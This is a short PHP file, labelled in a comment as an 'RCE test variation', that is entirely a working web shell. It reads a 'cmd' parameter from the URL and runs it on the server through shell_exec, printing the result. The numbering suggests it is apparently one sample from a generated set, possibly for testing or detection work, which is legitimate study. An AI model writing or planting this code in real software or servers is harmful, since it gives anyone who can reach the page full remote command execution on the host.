<?php
// RCE test variation #1005
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>